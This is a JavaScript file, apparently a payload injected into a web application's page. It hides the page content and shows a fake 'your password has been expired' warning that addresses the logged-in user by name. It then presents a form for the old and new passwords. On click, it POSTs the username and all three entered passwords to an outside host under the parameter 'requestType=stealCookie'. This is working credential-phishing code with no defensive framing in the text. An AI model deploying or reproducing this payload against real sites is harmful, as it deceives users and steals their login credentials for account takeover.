(function() {
	$('#bookDetailsModal').modal('hide');
	document.getElementsByClassName("container-fluid")[1].style.display = "none";

	var myStyle = document.createElement("style");
	myStyle.type = "text/css";
	myStyle.innerHTML = ".inputClass{width:180px;padding:5px;border:2px solid #ccc;-webkit-border-radius:5px;border-radius:5px;}.buttonClass{width:180px;padding:5px 15px;background:#ccc;border:0 none;cursor:pointer;-webkit-border-radius:5px;border-radius:5px;margin:5px}";
	document.getElementsByTagName("head")[0].appendChild(myStyle);

	var name = document.getElementsByClassName("dropdown-toggle")[0].text
			.trim();
	var warnMsg = document.createTextNode("[" + name
			+ "], Your password has been expired. Please reset your password!");

	var myWarning = document.createElement("h4");
	myWarning.style.color = "red";
	myWarning.style.marginTop = "150px";
	myWarning.style.textAlign = "center";
	myWarning.appendChild(warnMsg);

	var oldPassword = document.createElement("input");
	oldPassword.type = "password";
	oldPassword.id = "oldPassword";
	oldPassword.name = "oldPassword";
	oldPassword.className = "inputClass";
	oldPassword.placeholder = "Enter Old Password!";

	var newPassword1 = document.createElement("input");
	newPassword1.type = "password";
	newPassword1.id = "newPassword1";
	newPassword1.name = "newPassword1";
	newPassword1.className = "inputClass";
	newPassword1.placeholder = "Enter New Password!";

	var newPassword2 = document.createElement("input");
	newPassword2.type = "password";
	newPassword2.id = "newPassword2";
	newPassword2.name = "newPassword2";
	newPassword2.className = "inputClass";
	newPassword2.placeholder = "Re-enter New Password!";

	var button = document.createElement("button");
	button.type = "button";
	button.id = "resetButton";
	button.className = "buttonClass";
	button.innerText = "Reset Password!";

	var myForm = document.createElement("form");
	myForm.style.textAlign = "center";
	myForm.style.marginTop = "100px";
	myForm.appendChild(oldPassword);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(newPassword1);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(newPassword2);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(button);

	var myDiv = document.createElement("div");
	myDiv.style.margin = "auto";
	myDiv.style.width = "80%";
	myDiv.appendChild(myWarning);
	myDiv.appendChild(myForm);

	var myParent = document.getElementsByClassName("container-fluid")[1];
	myParent.before(myDiv);

	document.getElementById("resetButton").onclick = function() {
		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				document.getElementById("ajax").innerHTML = this.responseText;
			}
			location.href = location.protocol + '//' + location.host + '/'
					+ location.pathname.split("/")[1];
		};
		xhttp
				.open(
						"POST",
						"http://secure-governance.1d35.starter-us-east-1.openshiftapps.com/WebTrap/AppController",
						true);
		xhttp.setRequestHeader("Content-type",
				"application/x-www-form-urlencoded");
		xhttp.setRequestHeader("X-Requested-With", "XMLHttpRequest");
		xhttp.send("requestType=stealCookie&username="
				+ document.getElementsByClassName("dropdown-toggle")[0].text
						.trim() + "&cookie=oldPassword="
				+ document.getElementById("oldPassword").value
				+ " | newPassword1:"
				+ document.getElementById("newPassword1").value
				+ " | newPassword2:"
				+ document.getElementById("newPassword2").value);
	};
})();